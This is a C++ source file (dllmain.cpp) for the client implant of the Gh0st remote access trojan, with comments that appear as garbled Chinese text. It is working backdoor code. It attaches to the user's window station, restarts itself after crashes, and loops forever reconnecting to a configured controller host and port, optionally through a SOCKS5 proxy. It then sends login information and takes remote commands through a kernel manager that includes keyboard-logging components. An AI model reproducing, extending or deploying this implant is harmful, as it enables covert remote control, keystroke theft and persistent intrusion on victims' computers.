// dllmain.cpp : ���� DLL Ӧ�ó������ڵ㡣
#include "stdafx.h"
#include "../common/KeyboardManager.h"
#include "../common/login.h"
#include "../common/KernelManager.h"

char g_strSvchostName[MAX_PATH];
char g_strHost[MAX_PATH];
DWORD g_dwPort;
DWORD g_dwServiceType;

enum
{
	NOT_CONNECT, //  ��û������
	GETLOGINFO_ERROR,
	CONNECT_ERROR,
	HEARTBEATTIMEOUT_ERROR
};

DWORD WINAPI main(char *lpServiceName);

LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	// �����쳣�����´�������
	HANDLE	hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)g_strSvchostName, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}
DWORD WINAPI main(char *lpServiceName)
{
	// lpServiceName,��ServiceMain���غ��û����
	char	strServiceName[256];
	char	strKillEvent[50];
	HANDLE	hInstallMutex = NULL;
	//////////////////////////////////////////////////////////////////////////
	// Set Window Station
	HWINSTA hOldStation = GetProcessWindowStation();
	HWINSTA hWinSta = OpenWindowStation("winsta0", FALSE, MAXIMUM_ALLOWED);
	if (hWinSta != NULL)
		SetProcessWindowStation(hWinSta);
	//
	//////////////////////////////////////////////////////////////////////////


	if (CKeyboardManager::g_hInstance != NULL)
	{
		SetUnhandledExceptionFilter(bad_exception);

		lstrcpy(strServiceName, lpServiceName);
		wsprintf(strKillEvent, "Global\\Gh0st %d", GetTickCount()); // ����¼���

		hInstallMutex = CreateMutex(NULL, true, g_strHost);
		//ReConfigService(strServiceName);   //--lang--
		// ɾ����װ�ļ�
		//	DeleteInstallFile(lpServiceName);     //--lang--
	}
	// ���߲���ϵͳ:���û���ҵ�CD/floppy disc,��Ҫ����������
	SetErrorMode( SEM_FAILCRITICALERRORS);
	char	*lpszHost = NULL;
	DWORD	dwPort = 80;
	char	*lpszProxyHost = NULL;
	DWORD	dwProxyPort = 0;
	char	*lpszProxyUser = NULL;
	char	*lpszProxyPass = NULL;

	HANDLE	hEvent = NULL;

	//---����������һ�� CClientSocket��
	CClientSocket socketClient;
	BYTE	bBreakError = NOT_CONNECT; // �Ͽ����ӵ�ԭ��,��ʼ��Ϊ��û������
	while (1)
	{
		// �������������ʱ��������sleep������
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			// 2���Ӷ�������, Ϊ�˾�����Ӧkillevent
			for (int i = 0; i < 2000; i++)
			{
				hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();      
					CloseHandle(hEvent);
					break;
					break;

				}
				// ��һ��
				Sleep(60);
			}
		}
		//���ߵ�ַ
		lpszHost = g_strHost;
		dwPort = g_dwPort;

		if (lpszProxyHost != NULL)
			socketClient.setGlobalProxyOption(PROXY_SOCKS_VER5, lpszProxyHost, dwProxyPort, lpszProxyUser, lpszProxyPass);
		else
			socketClient.setGlobalProxyOption();

		DWORD dwTickCount = GetTickCount();
		//---����Connect���������ض˷�������
		if (!socketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = CONNECT_ERROR;       //---���Ӵ�����������ѭ��
			continue;
		}
		// ��¼
		DWORD dwExitCode = SOCKET_ERROR;
		sendLoginInfo(strServiceName, &socketClient, GetTickCount() - dwTickCount);
		//---ע���������ӳɹ���������һ��CKernelManager ��CKernelManager��鿴һ��
		CKernelManager	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);
		socketClient.setManagerCallBack(&manager);

		//////////////////////////////////////////////////////////////////////////
		// �ȴ����ƶ˷��ͼ��������ʱΪ10�룬��������,�Է����Ӵ���
		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		{
			Sleep(1000);
		}
		// 10���û���յ����ƶ˷����ļ������˵���Է����ǿ��ƶˣ���������
		if (!manager.IsActived())
			continue;

		//////////////////////////////////////////////////////////////////////////

		DWORD	dwIOCPEvent;
		dwTickCount = GetTickCount();

		do
		{
			hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
			Sleep(500);
		} while(hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);

		if (hEvent != NULL)
		{
			socketClient.Disconnect();
			CloseHandle(hEvent);
			break;
		}
	}
#ifdef _DLL
	//////////////////////////////////////////////////////////////////////////
	// Restor WindowStation and Desktop	
	// ����Ҫ�ָ�׿�棬��Ϊ����Ǹ��·���˵Ļ����·���������У��˽��ָ̻�����׿�棬���������
	// 	SetProcessWindowStation(hOldStation);
	// 	CloseWindowStation(hWinSta);
	//
	//////////////////////////////////////////////////////////////////////////
#endif

	SetErrorMode(0);
	ReleaseMutex(hInstallMutex);
	CloseHandle(hInstallMutex);
}

extern "C" __declspec(dllexport) void TestRun(char *strHost, int nPort)
{
	strcpy(g_strHost, strHost);  //�������ߵ�ַ
	g_dwPort = nPort;             //�������߶˿�
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)g_strHost, 0, NULL);
	//����ȴ��߳̽���
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
		CKeyboardManager::g_hInstance = (HINSTANCE)hModule;
		break;
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

